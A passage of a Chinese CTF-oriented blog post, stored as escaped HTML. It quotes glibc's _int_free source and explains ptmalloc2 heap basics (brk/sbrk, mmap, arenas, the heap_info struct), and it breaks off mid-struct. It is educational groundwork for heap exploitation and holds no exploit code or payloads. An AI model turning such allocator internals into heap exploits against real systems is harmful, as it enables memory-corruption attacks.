class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;       size of the chunk that we are adding.  We can dereference OLD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;       only if we have the lock, otherwise it might have already been&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;       allocated again.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;//тєЇТгАТБђТЪЦ№╝їfast bin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (have_lock &amp;amp;&amp;amp; old != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;amp;&amp;amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;invalid fastbin entry (free)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тдѓТъюУ»Ц chunk т╣ХжЮъ mmap () ућЪТѕљуџё№╝їт░▒жюђУдЂУ┐ЏУАїтљѕт╣Х№╝їУ┐ЄуеІтдѓтЅЇжЮбТЅђУ«▓№╝їтЁѕтљЉтљјтљѕт╣Х№╝їтєЇтљЉтЅЇтљѕт╣ХсђѓтдѓТъютљѕт╣ХС╣Ітљјуџё chunk УХЁУ┐ЄС║є FASTBIN_CONSOLIDATION_THRESHOLD  №╝їт░▒С╝џТЋ┤уљє fast bin т╣ХтљЉу│╗у╗ЪУ┐ћУ┐ўтєЁтГўсђѓ _int_free () тЄйТЋ░тѕ░ТГцу╗ЊТЮЪсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      If freeing a large space, consolidate possibly-surrounding&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      chunks. Then, if the total unused topmost memory exceeds trim&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      threshold, ask malloc_trim to reduce top.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      Unless max_fast is 0, we don&amp;#x27;t know if there are fastbins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      bordering top, so we cannot tell for sure whether threshold&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      has been reached unless fastbins are consolidated.  But we&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      don&amp;#x27;t want to consolidate on each free.  As a compromise,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      is reached.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;    */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)(size) &amp;gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (atomic_load_relaxed (&amp;amp;av-&amp;gt;have_fastchunks))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	malloc_consolidate(av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (av == &amp;amp;main_arena) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifndef&lt;/span&gt; MORECORE_CANNOT_TRIM&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)(chunksize(av-&amp;gt;top)) &amp;gt;=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)(mp_.trim_threshold))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  systrim(mp_.top_pad, av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;/* Always try heap_trim(), even if the top chunk is not&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	   large, because the corresponding heap might go away.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	heap_info *heap = heap_for_ptr(top(av));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(heap-&amp;gt;ar_ptr == av);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	heap_trim(heap, mp_.top_pad);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!have_lock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      __libc_lock_unlock (av-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;    If the chunk was allocated via mmap, release via munmap().&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    munmap_chunk (p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;h1 id=&#34;glibcтаєТдѓУ┐░&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibcтаєТдѓУ┐░&#34;&gt;#&lt;/a&gt; glibc таєТдѓУ┐░№╝џ&lt;/h1&gt;
&lt;h2 id=&#34;1тєЁтГўу«АуљєСИјтає&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1тєЁтГўу«АуљєСИјтає&#34;&gt;#&lt;/a&gt; 1. тєЁтГўу«АуљєСИјтає№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;ТдѓУ┐░&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ТдѓУ┐░&#34;&gt;#&lt;/a&gt; ТдѓУ┐░№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тєЁтГўу«АуљєТў»таєУ«Ау«ЌТю║уџётєЁтГўУхёТ║љУ┐ЏУАїу«Ауљє№╝їУ┐ЎУдЂТ▒ѓтюеуеІт║ЈУ»иТ▒ѓТЌХУЃйтцЪтіеТђЂтѕєжЁЇтєЁтГўуџёСИђжЃетѕє№╝їт╣ХтюеуеІт║ЈСИЇжюђУдЂТЌХжЄіТћЙтѕєжЁЇуџётєЁтГўсђѓCTF уФъУхЏСИГтИИУДЂуџё ptmalloc2 т░▒Тў» glibc т«ъуј░уџётєЁтГўу«АуљєТю║тѕХ№╝їт«Ѓу╗ДТЅ┐С║є dlmalloc№╝їт╣ХТЈљСЙЏС║єт»╣тцџу║┐уеІуџёТћ»ТїЂсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	таєТў»уеІт║ЈУЎџТІЪтєЁтГўСИГућ▒Сйјтю░тЮђтљЉжФўтю░тЮђтбъжЋ┐уџёу║┐ТђДтї║тЪЪсђѓСИђУѕгтЈфТюЅтйЊућеТѕитљЉТЊЇСйюу│╗у╗Ъућ│У»итєЁтГўТЌХ№╝їУ┐ЎуЅЄтї║тЪЪТЅЇС╝џУбФтєЁТаИтѕєжЁЇтЄ║ТЮЦ№╝їт╣ХСИћтцёС║јТЋѕујЄтњїжАхт»╣жйљуџёУђЃУЎЉ№╝їжђџтИИС╝џтѕєжЁЇуЏИтйЊтцДуџёУ┐ъу╗ГтєЁтГўсђѓуеІт║ЈтєЇТгАућ│У»иТЌХСЙ┐С╝џС╗јУ┐ЎуЅЄтєЁтГўСИГтѕєжЁЇ№╝їуЏ┤тѕ░таєуЕ║жЌ┤СИЇУЃйТ╗АУХ│ТЌХТЅЇС╝џтєЇТгАтбъжЋ┐сђѓтаєуџёСйЇуй«СИђУѕгтюе BSS Т«хжФўтю░тЮђтцёсђѓ&lt;/p&gt;
&lt;h3 id=&#34;brkтњїsbrk&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#brkтњїsbrk&#34;&gt;#&lt;/a&gt; brk () тњї sbrk ()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	таєуџёт▒ъТђДТў»тЈ»У»╗тЈ»тєЎуџё№╝їтцДт░ЈжђџУ┐Є brk () тњї sbrk () тЄйТЋ░У┐ЏУАїТјДтѕХсђѓтюетаєТюфтѕЮтДІтїќТЌХ№╝їprogram_break ТїЄтљЉ BSS Т«хуџёТюФт░Й№╝їжђџУ┐ЄУ░Ѓуће brk () тњї sbrk () ТЮЦуД╗тіе program_break Сй┐тЙЌтаєтбъжЋ┐сђѓтюетаєтѕЮтДІтїќТЌХ№╝їтдѓТъют╝ђтљ»С║є ASLR№╝їтѕЎтаєуџёУхитДІтю░тЮђ start_brk С╝џтюе BSS Т«хС╣ІтљјуџёжџЈТю║СйЇуД╗тЄ║№╝їтдѓТъюТ▓АТюЅт╝ђтљ»№╝їтѕЎ start_brk С╝џу┤ДТјЦуЮђ BSS Т«хсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	СИцСИфтЄйТЋ░уЏИтЁ│тєЁт«╣тдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;brk&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;* end_data_segment)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *&lt;span class=&#34;title function_&#34;&gt;sbrk&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;intptr_t&lt;/span&gt; increment)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/44bf6e33773c4e7c83318714e950a7e5.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	brk () тЄйТЋ░уџётЈѓТЋ░Тў»СИђСИфТїЄжњѕ№╝їућеС║јУ«Йуй« program_break ТїЄтљЉуџёСйЇуй«сђѓsbrk () тЄйТЋ░уџётЈѓТЋ░ increment (тЈ»С╗ЦТў»У┤Ътђ╝) ућеС║јСИј program_break уЏИтіаТЮЦУ░ЃТЋ┤ program_break уџётђ╝сђѓТѕљтіЪТЅДУАїтљј brk () тЄйТЋ░С╝џУ┐ћтЏъ 0 №╝їsbrk () тЄйТЋ░С╝џУ┐ћтЏъСИіСИђТгА program_break тђ╝№╝ѕтЈ»С╗ЦУ«Йуй«тЈѓТЋ░ increment СИ║ 0 ТЮЦУјитЙЌтйЊтЅЇ program_break уџётђ╝№╝Ѕсђѓ&lt;/p&gt;
&lt;h3 id=&#34;mmapтњїunmmap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mmapтњїunmmap&#34;&gt;#&lt;/a&gt; mmap () тњї unmmap ()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тйЊућеТѕиућ│У»итєЁтГўУ┐ЄтцДТЌХ№╝їptmalloc2 С╝џжђЅТІЕжђџУ┐Є mmap () тЄйТЋ░тѕЏт╗║тї┐тљЇТўат░ёТ«хСЙЏућеТѕиСй┐уће№╝їт╣ХжђџУ┐Є unmmap () тЄйТЋ░тЏъТћХсђѓ&lt;/p&gt;
&lt;h3 id=&#34;glibcСИГуџётає&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibcСИГуџётає&#34;&gt;#&lt;/a&gt; glibc СИГуџётає№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	жђџтИИТЮЦУ»┤№╝їу│╗у╗ЪСИГуџётаєТїЄуџёТў»СИ╗у║┐уеІСИГ main_arena ТЅђу«Ауљєуџётї║тЪЪсђѓСйє glibc С╝џтљїТЌХу╗┤ТїЂтцџСИфтї║тЪЪТЮЦСЙЏтцџу║┐уеІСй┐уће№╝їТ»ЈСИфу║┐уеІжЃйТюЅт▒ъС║јУЄфти▒уџётєЁтГў№╝ѕТѕљСИ║ arena№╝Ѕ№╝їУ┐ЎС║ЏУ┐ъу╗ГуџётєЁтГўС╣ЪтЈ»С╗ЦТѕљСИ║таєсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	glibc уџёТЃ│Т│ЋТў»№╝џтйЊућеТѕиућ│У»итаєтЮЌТЌХ№╝їС╗јтаєСИГТїЅжА║т║ЈтѕєжЁЇтаєтЮЌС║цу╗ЎућеТѕи№╝їућеТѕиС┐ЮтГўТїЄтљЉУ┐ЎС║ЏтаєтЮЌуџёТїЄжњѕ№╝ЏтйЊућеТѕижЄіТћЙтаєтЮЌТЌХ№╝їglibc С╝џт░єжЄіТћЙуџётаєтЮЌу╗ёу╗ЄТѕљжЊЙУАе№╝ЏтйЊСИцтЮЌуЏИтаєтЮЌжЃйСИ║жЄіТћЙуіХТђЂТЌХт░єС╣Ітљѕт╣ХТѕљСИђСИфТќ░уџётаєтЮЌ№╝Џућ▒ТГцУДБтє│тєЁтГўубјуЅЄуџёжЌ«жбўсђѓућеТѕиТГБтюеСй┐ућеСИГуџётаєтЮЌтЈФСйю allocated chunk№╝їУбФжЄіТћЙуџётаєтЮЌтЈФтЂџ free chunk№╝їућ▒ free chunk у╗ёТѕљуџёжЊЙУАетЈФ binсђѓ** ТѕЉС╗гуД░тЉ╝тйЊтЅЇ chunk Сйјтю░тЮђтцёуЏИжѓ╗уџё chunk СИ║СИіСИђСИф№╝ѕтљјжЮбуџё№╝Ѕchunk№╝їжФўтю░тЮђуЏИжѓ╗тцёуџё chunk СИ║СИІСИђСИф№╝ѕтЅЇжЮбуџё№╝Ѕchunkсђѓ** СИ║С║єТќ╣СЙ┐у«Ауљє№╝їglibc т░єСИЇтљїтцДт░ЈУїЃтЏ┤уџё chunk у╗ёу╗ЄТѕљСИЇтљїуџё bin сђѓтдѓ fast bin сђЂsmall bin сђЂlarge bin уГЅ№╝їтюеУ┐ЎС║ЏжЊЙУАеСИГуџё chunk тѕєтѕФтЈФСйю fast chunk сђЂsmall chunk тњї large chunk сђѓ&lt;/p&gt;
&lt;h2 id=&#34;2жЄЇУдЂТдѓт┐хтњїу╗ЊТъёСйЊ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2жЄЇУдЂТдѓт┐хтњїу╗ЊТъёСйЊ&#34;&gt;#&lt;/a&gt; 2. жЄЇУдЂТдѓт┐хтњїу╗ЊТъёСйЊ№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;arena&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#arena&#34;&gt;#&lt;/a&gt; arena№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	arena тїЁтљФСИђуЅЄТѕќТЋ░уЅЄУ┐ъу╗ГуџётєЁтГў№╝їтаєтЮЌт░єС╝џС╗јУ┐ЎуЅЄтї║тЪЪтѕњтѕєу╗ЎућеТѕисђѓСИ╗у║┐уеІуџё arena УбФуД░СИ║ main_arena№╝їт«ЃтїЁтљФ start_brk тњї brk С╣ІжЌ┤уџёУ┐ЎуЅЄУ┐ъу╗ГтєЁтГўсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	СИ╗у║┐уеІуџё arena тЈфТюЅтає№╝їтГљу║┐уеІуџё arena тЈ»С╗ЦТюЅТЋ░уЅЄУ┐ъу╗ГтєЁтГўсђѓтдѓТъюСИ╗у║┐уеІуџётаєтцДт░ЈСИЇтцЪтѕєуџёУ»ЮтЈ»С╗ЦжђџУ┐Є brk () У░ЃућеТЮЦТЅЕт▒Ћ№╝їСйєТў»тГљу║┐уеІтѕєжЁЇуџёТўат░ёТ«хтцДт░ЈТў»тЏ║т«џуџё№╝їСИЇтЈ»С╗ЦТЅЕт▒Ћ№╝їТЅђС╗ЦтГљу║┐уеІтѕєжЁЇтЄ║ТЮЦуџёСИђТ«хТўат░ёТ«хСИЇтцЪућеуџёУ»Ют░▒жюђУдЂтєЇТгАСй┐уће mmap () ТЮЦтѕєжЁЇТќ░уџётєЁтГўсђѓ&lt;/p&gt;
&lt;h3 id=&#34;heap_infoу╗ЊТъёСйЊ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#heap_infoу╗ЊТъёСйЊ&#34;&gt;#&lt;/a&gt; heap_info у╗ЊТъёСйЊ№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тдѓС╣ІтЅЇТЅђУ»┤№╝їтГљу║┐уеІуџё arena тЈ»С╗ЦТюЅтцџуЅЄУ┐ъу╗ГтєЁтГў№╝їУ┐ЎС║ЏтєЁтГўУбФуД░СИ║ heapсђѓТ»ЈСИђСИф heap жЃйТюЅУЄфти▒уџё heap header сђѓтЁХт«џС╣ЅтдѓСИІ№╝їheap header Тў»жђџУ┐ЄжЊЙУАеуЏИУ┐ъТјЦуџё№╝їт╣ХСИћ heap header жЄїжЮбС┐ЮтГўС║єТїЄтљЉтЁХС╗ќТЅђт▒ъуџё arena уџёТїЄжњѕсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;heap_info&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mstate ar_ptr;				 	&lt;span class=&#34;comment&#34;&gt;/* Arena for this heap. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;heap_info&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;prev&lt;/span&gt;;&lt;/span&gt; 			&lt;span class=&#34;comment&#34;&gt;/* Previous heap. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size;   					&lt;span class=&#34;comment&#34;&gt;/* Current size in bytes. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; mprotect_size; 			&lt;span class=&#34;comment&#34;&gt;/* Size in bytes that has been mprotected&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;                           			   PROT_READ|PROT_WRITE.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Make sure the following data is properly aligned, particularly&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     MALLOC_ALIGNMENT. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; pad[&lt;span class=&#34;number&#34;&gt;-6&lt;/span&gt; * 